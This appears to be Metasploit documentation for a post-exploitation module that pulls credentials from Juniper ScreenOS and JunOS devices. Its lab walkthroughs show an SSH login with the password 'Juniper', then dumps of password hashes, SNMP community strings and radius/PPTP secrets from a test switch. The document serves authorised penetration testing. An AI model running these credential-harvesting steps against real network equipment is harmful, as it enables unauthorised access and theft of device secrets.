## Vulnerable Application

This module has been tested on the following hardware/OS combinations.

* ScreenOS
* JunOS
  * ex2200-48t-4g, JUNOS Base OS boot 12.3R7.7

The ex2200 config can be found [here](https://github.com/h00die/MSF-Testing-Scripts/blob/master/juniper_ex2200.config)

This module will look for the following parameters which contain credentials:

* ScreenOS
  * admin
  * user
  * SNMP
  * ppp
  * ike
* JunOS
  * root-authentication
  * user
  * SNMP
  * radius
  * pptp/ppp (pap)

## Verification Steps

  1. Start msfconsole
  2. Get a shell
  3. Do: ```use post/networking/gather/enum_juniper```
  4. Do: ```set session [id]```
  5. Do: ```set verbose true```
  6. Do: ```run```

## Options

## Scenarios

### ex2200-48t-4g, JUNOS Base OS boot 12.3R7.7

#### root Login (SSH Shell)

```
msf5 > auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.1.5
rhosts => 192.168.1.5
msf5 auxiliary(scanner/ssh/ssh_login) > set username root
username => root
msf5 auxiliary(scanner/ssh/ssh_login) > set password Juniper
password => Juniper
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.168.1.5:22 - Success: 'root:Juniper' 'Hostname: h00dieJuniperEx2200, Model: ex2200-48t-4g, JUNOS Base OS boot [12.3R7.7]'
[*] Command shell session 1 opened (192.168.1.6:45623 -> 192.168.1.5:22) at 2020-07-14 20:48:58 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/ssh/ssh_login) > use post/networking/gather/enum_juniper 
msf5 post(networking/gather/enum_juniper) > set session 1
session => 1
msf5 post(networking/gather/enum_juniper) > run
[*] In an SSH shell
[*] Getting version information
[*] Original OS Guess junos, is now JunOS 12.3R7.7
[*] The device OS is junos
[+] Config information stored in to loot /root/.msf4/loot/20180220201446_default_192.168.1.5_juniper.junos.co_197469.txt
[*] Gathering info from cli show configuration
[+] Saving to /root/.msf4/loot/20180220201451_default_192.168.1.5_juniper.get_conf_465493.txt
[+] root password hash: $1$pz9b1.fq$foo5r85Ql8mXdoRUe0C1E.
[+] User 2000 named newuser in group super-user found with password hash $1$rm8FaMFY$k4LFxqsVAiGO5tKqyO9jJ/.
[+] User 2002 named newuser2 in group operator found with password hash $1$aDZi44AP$bQGGjqPJ.F.Cm5QvX2yaa0.
[+] User 2003 named newuser3 in group read-only found with password hash $1$1.YvKzUY$dcAj99KngGhFZTpxGjA93..
[+] User 2004 named newuser4 in group unauthorized found with password hash $1$bdWYaqOE$z6oTSJS3p1R8CoNaos9Ce/.
[+] SNMP community read with permissions read-only
[+] SNMP community public with permissions read-only
[+] SNMP community private with permissions read-write
[+] SNMP community secretsauce with permissions read-write
[+] SNMP community hello there with permissions read-write
[+] radius server 1.1.1.1 password hash: $9$Y-4GikqfF39JGCu1Ileq.PQ6AB1hrlMBIyKvWdV
[+] PPTP username 'pap_username' hash $9$he4revM87-dsevm5TQCAp0BErvLxd4JDNdkPfT/9BIR via PAP
[*] Post module execution completed
msf5 post(networking/gather/enum_juniper) > creds
Credentials
===========

host         origin       service            public          private                                         realm  private_type
----         ------       -------            ------          -------                                         -----  ------------
1.1.1.1      1.1.1.1      1812/udp (radius)                  $9$Y-4GikqfF39JGCu1Ileq.PQ6AB1hrlMBIyKvWdV             Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             root            Juniper                                                Password
192.168.1.5  192.168.1.5  22/tcp             root            $1$pz9b1.fq$foo5r85Ql8mXdoRUe0C1E.                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser         $1$rm8FaMFY$k4LFxqsVAiGO5tKqyO9jJ/                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser2        $1$aDZi44AP$bQGGjqPJ.F.Cm5QvX2yaa0                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser3        $1$1.YvKzUY$dcAj99KngGhFZTpxGjA93.                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser4        $1$bdWYaqOE$z6oTSJS3p1R8CoNaos9Ce/                     Nonreplayable hash
192.168.1.5  192.168.1.5  161/udp (snmp)                     read                                                   Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     public                                                 Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     private                                                Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     secretsauce                                            Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     hello there                                            Password
192.168.1.5  192.168.1.5  1723/tcp (pptp)    'pap_username'  $9$he4revM87-dsevm5TQCAp0BErvLxd4JDNdkPfT/9BIR         Nonreplayable hash
```

#### cli Login

```
msf5 > auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.1.5
rhosts => 192.168.1.5
msf5 auxiliary(scanner/ssh/ssh_login) > set username newuser
username => newuser
msf5 auxiliary(scanner/ssh/ssh_login) > set password Newuser
password => Newuser
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.168.1.5:22 - Success: 'newuser:Newuser' 'Hostname: h00dieJuniperEx2200, Model: ex2200-48t-4g, JUNOS Base OS boot [12.3R7.7]'
[*] Command shell session 2 opened (192.168.1.6:45623 -> 192.168.1.5:22) at 2018-02-19 21:32:20 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
resource (juniper_ex2200.rc)> use post/networking/gather/enum_juniper
resource (juniper_ex2200.rc)> set session 2
session => 2
resource (juniper_ex2200.rc)> set verbose true
verbose => true
resource (juniper_ex2200.rc)> run
[*] In a cli shell
[*] Getting version information
[*] Original OS Guess junos, is now JunOS 12.3R7.7
[*] The device OS is junos
[+] Config information stored in to loot /root/.msf4/loot/20180219213231_default_192.168.1.5_juniper.junos.co_752483.txt
[*] Gathering info from show configuration
[+] Saving to /root/.msf4/loot/20180219213236_default_192.168.1.5_juniper.get_conf_613948.txt
[+] root password hash: $1$pz9b1.fq$foo5r85Ql8mXdoRUe0C1E.
[+] User 2000 named newuser in group super-user found with password hash $1$rm8FaMFY$k4LFxqsVAiGO5tKqyO9jJ/.
[+] User 2002 named newuser2 in group operator found with password hash $1$aDZi44AP$bQGGjqPJ.F.Cm5QvX2yaa0.
[+] User 2003 named newuser3 in group read-only found with password hash $1$1.YvKzUY$dcAj99KngGhFZTpxGjA93..
[+] User 2004 named newuser4 in group unauthorized found with password hash $1$bdWYaqOE$z6oTSJS3p1R8CoNaos9Ce/.
[+] SNMP community read with permissions read-only
[+] SNMP community public with permissions read-only
[+] SNMP community private with permissions read-write
[+] SNMP community secretsauce with permissions read-write
[+] SNMP community hello there with permissions read-write
[+] radius server 1.1.1.1 password hash: $9$Y-4GikqfF39JGCu1Ileq.PQ6AB1hrlMBIyKvWdV
[+] PPTP username 'pap_username' hash $9$he4revM87-dsevm5TQCAp0BErvLxd4JDNdkPfT/9BIR via PAP
[*] Post module execution completed
resource (juniper_ex2200.rc)> creds -d
Credentials
===========

host         origin       service            public          private                                         realm  private_type
----         ------       -------            ------          -------                                         -----  ------------
1.1.1.1      1.1.1.1      1812/udp (radius)                  $9$Y-4GikqfF39JGCu1Ileq.PQ6AB1hrlMBIyKvWdV             Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser         Newuser                                                Password
192.168.1.5  192.168.1.5  22/tcp             root            $1$pz9b1.fq$foo5r85Ql8mXdoRUe0C1E.                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser         $1$rm8FaMFY$k4LFxqsVAiGO5tKqyO9jJ/                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser2        $1$aDZi44AP$bQGGjqPJ.F.Cm5QvX2yaa0                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser3        $1$1.YvKzUY$dcAj99KngGhFZTpxGjA93.                     Nonreplayable hash
192.168.1.5  192.168.1.5  22/tcp             newuser4        $1$bdWYaqOE$z6oTSJS3p1R8CoNaos9Ce/                     Nonreplayable hash
192.168.1.5  192.168.1.5  161/udp (snmp)                     read                                                   Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     public                                                 Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     private                                                Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     secretsauce                                            Password
192.168.1.5  192.168.1.5  161/udp (snmp)                     hello there                                            Password
192.168.1.5  192.168.1.5  1723/tcp (pptp)    'pap_username'  $9$he4revM87-dsevm5TQCAp0BErvLxd4JDNdkPfT/9BIR         Nonreplayable hash
```

